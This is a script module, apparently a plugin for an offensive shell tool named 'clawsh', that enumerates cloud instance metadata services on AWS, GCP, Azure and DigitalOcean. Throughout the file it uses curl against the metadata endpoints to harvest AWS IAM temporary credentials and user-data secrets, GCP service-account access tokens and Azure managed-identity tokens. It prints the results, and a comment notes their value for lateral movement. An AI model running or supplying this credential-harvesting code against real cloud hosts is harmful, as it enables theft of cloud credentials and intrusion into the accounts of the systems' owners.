// @name: cloud_meta
// @description: Cloud metadata service (IMDS) enumeration — AWS, GCP, Azure, DO
// @category: enumerate
// @target_os: linux
// @author: clawsh
// @version: 1.0

let output = "=== Cloud Metadata Service (IMDS) Enumeration ===\n";
let cloud_detected = "none";

// --- Detect cloud provider from system info ---
let dmi = exec_cmd("cat /sys/class/dmi/id/board_vendor /sys/class/dmi/id/sys_vendor /sys/class/dmi/id/product_name 2>/dev/null");
let cloud_hint = "unknown";
if dmi.contains("Amazon") || dmi.contains("EC2") {
    cloud_hint = "AWS";
} else if dmi.contains("Google") {
    cloud_hint = "GCP";
} else if dmi.contains("Microsoft") {
    cloud_hint = "Azure";
} else if dmi.contains("DigitalOcean") {
    cloud_hint = "DigitalOcean";
}

output += "\n  \x1b[2mDMI vendor hint: " + cloud_hint + "\x1b[0m\n";

// --- AWS ---
output += "\n\x1b[1;4mAWS (IMDSv1):\x1b[0m\n";
let aws_meta = exec_cmd_timeout("curl -s --connect-timeout 2 --max-time 3 http://169.254.169.254/latest/meta-data/ 2>/dev/null", 5);
if aws_meta.len() > 0 && !aws_meta.contains("404") && !aws_meta.contains("timed out") {
    cloud_detected = "AWS";
    output += "  \x1b[1;33mAWS metadata accessible!\x1b[0m\n";

    let instance_id = exec_cmd_timeout("curl -s --connect-timeout 2 --max-time 3 http://169.254.169.254/latest/meta-data/instance-id 2>/dev/null", 5);
    let instance_type = exec_cmd_timeout("curl -s --connect-timeout 2 --max-time 3 http://169.254.169.254/latest/meta-data/instance-type 2>/dev/null", 5);
    let local_ip = exec_cmd_timeout("curl -s --connect-timeout 2 --max-time 3 http://169.254.169.254/latest/meta-data/local-ipv4 2>/dev/null", 5);
    let public_ip = exec_cmd_timeout("curl -s --connect-timeout 2 --max-time 3 http://169.254.169.254/latest/meta-data/public-ipv4 2>/dev/null", 5);
    let hostname_aws = exec_cmd_timeout("curl -s --connect-timeout 2 --max-time 3 http://169.254.169.254/latest/meta-data/hostname 2>/dev/null", 5);
    let az = exec_cmd_timeout("curl -s --connect-timeout 2 --max-time 3 http://169.254.169.254/latest/meta-data/placement/availability-zone 2>/dev/null", 5);
    let mac = exec_cmd_timeout("curl -s --connect-timeout 2 --max-time 3 http://169.254.169.254/latest/meta-data/mac 2>/dev/null", 5);

    output += "  Instance ID:   " + instance_id.trim() + "\n";
    output += "  Instance Type: " + instance_type.trim() + "\n";
    output += "  Local IP:      " + local_ip.trim() + "\n";
    output += "  Public IP:     " + public_ip.trim() + "\n";
    output += "  Hostname:      " + hostname_aws.trim() + "\n";
    output += "  AZ:            " + az.trim() + "\n";

    // IAM role — most critical for lateral movement
    let iam_role = exec_cmd_timeout("curl -s --connect-timeout 2 --max-time 3 http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null", 5);
    if iam_role.len() > 0 && !iam_role.contains("404") {
        output += "\n  \x1b[1;31mIAM Role: " + iam_role.trim() + "\x1b[0m\n";
        let creds = exec_cmd_timeout("curl -s --connect-timeout 2 --max-time 5 http://169.254.169.254/latest/meta-data/iam/security-credentials/" + iam_role.trim() + " 2>/dev/null", 7);
        if creds.len() > 0 {
            output += "  \x1b[1;31mTemporary credentials available!\x1b[0m\n";
            for line in creds.split("\n") {
                if line.len() > 0 {
                    output += "    " + line + "\n";
                }
            }
        }
    }

    // User-data (often contains secrets/bootstrap scripts)
    let userdata = exec_cmd_timeout("curl -s --connect-timeout 2 --max-time 3 http://169.254.169.254/latest/user-data 2>/dev/null | head -30", 5);
    if userdata.len() > 0 && !userdata.contains("404") {
        output += "\n  \x1b[33mUser-data available:\x1b[0m\n";
        for line in userdata.split("\n") {
            if line.len() > 0 {
                output += "    " + line + "\n";
            }
        }
    }
} else {
    output += "  (not reachable or not AWS)\n";
}

// --- GCP ---
output += "\n\x1b[1;4mGCP:\x1b[0m\n";
let gcp_meta = exec_cmd_timeout("curl -s --connect-timeout 2 --max-time 3 -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/ 2>/dev/null", 5);
if gcp_meta.len() > 0 && !gcp_meta.contains("timed out") && gcp_meta.contains("instance") {
    cloud_detected = "GCP";
    output += "  \x1b[1;33mGCP metadata accessible!\x1b[0m\n";

    let gcp_project = exec_cmd_timeout("curl -s --connect-timeout 2 -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/project/project-id 2>/dev/null", 5);
    let gcp_zone = exec_cmd_timeout("curl -s --connect-timeout 2 -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/zone 2>/dev/null", 5);
    let gcp_hostname = exec_cmd_timeout("curl -s --connect-timeout 2 -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/hostname 2>/dev/null", 5);
    let gcp_sa = exec_cmd_timeout("curl -s --connect-timeout 2 -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/ 2>/dev/null", 5);

    output += "  Project:       " + gcp_project.trim() + "\n";
    output += "  Zone:          " + gcp_zone.trim() + "\n";
    output += "  Hostname:      " + gcp_hostname.trim() + "\n";

    if gcp_sa.len() > 0 {
        output += "  \x1b[1;31mService Accounts: " + gcp_sa.trim() + "\x1b[0m\n";
        // Try to get access token
        let gcp_token = exec_cmd_timeout("curl -s --connect-timeout 2 -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token 2>/dev/null | head -3", 5);
        if gcp_token.len() > 0 && gcp_token.contains("access_token") {
            output += "  \x1b[1;31mAccess token available!\x1b[0m\n";
            output += "    " + gcp_token.trim() + "\n";
        }
    }
} else {
    output += "  (not reachable or not GCP)\n";
}

// --- Azure ---
output += "\n\x1b[1;4mAzure:\x1b[0m\n";
let azure_meta = exec_cmd_timeout("curl -s --connect-timeout 2 --max-time 3 -H 'Metadata: true' 'http://169.254.169.254/metadata/instance?api-version=2021-02-01' 2>/dev/null | head -20", 5);
if azure_meta.len() > 0 && !azure_meta.contains("timed out") && (azure_meta.contains("compute") || azure_meta.contains("vmId")) {
    cloud_detected = "Azure";
    output += "  \x1b[1;33mAzure metadata accessible!\x1b[0m\n";
    for line in azure_meta.split("\n") {
        if line.len() > 0 {
            output += "    " + line + "\n";
        }
    }

    // Managed identity token
    let azure_token = exec_cmd_timeout("curl -s --connect-timeout 2 -H 'Metadata: true' 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' 2>/dev/null | head -5", 5);
    if azure_token.len() > 0 && azure_token.contains("access_token") {
        output += "  \x1b[1;31mManaged Identity token available!\x1b[0m\n";
    }
} else {
    output += "  (not reachable or not Azure)\n";
}

// --- DigitalOcean ---
output += "\n\x1b[1;4mDigitalOcean:\x1b[0m\n";
let do_meta = exec_cmd_timeout("curl -s --connect-timeout 2 --max-time 3 http://169.254.169.254/metadata/v1/ 2>/dev/null | head -10", 5);
if do_meta.len() > 0 && !do_meta.contains("timed out") && do_meta.len() > 5 {
    cloud_detected = "DigitalOcean";
    output += "  \x1b[1;33mDigitalOcean metadata accessible!\x1b[0m\n";
    let do_id = exec_cmd_timeout("curl -s --connect-timeout 2 http://169.254.169.254/metadata/v1/id 2>/dev/null", 5);
    let do_hostname = exec_cmd_timeout("curl -s --connect-timeout 2 http://169.254.169.254/metadata/v1/hostname 2>/dev/null", 5);
    let do_region = exec_cmd_timeout("curl -s --connect-timeout 2 http://169.254.169.254/metadata/v1/region 2>/dev/null", 5);
    output += "  ID:       " + do_id.trim() + "\n";
    output += "  Hostname: " + do_hostname.trim() + "\n";
    output += "  Region:   " + do_region.trim() + "\n";
} else {
    output += "  (not reachable or not DO)\n";
}

// --- Summary ---
output += "\n\x1b[1mCloud provider detected: " + cloud_detected + "\x1b[0m\n";

print_output(output);

let RESULT = "Cloud: " + cloud_detected;

let DATA = #{
    cloud_provider: cloud_detected,
    dmi_hint: cloud_hint,
};
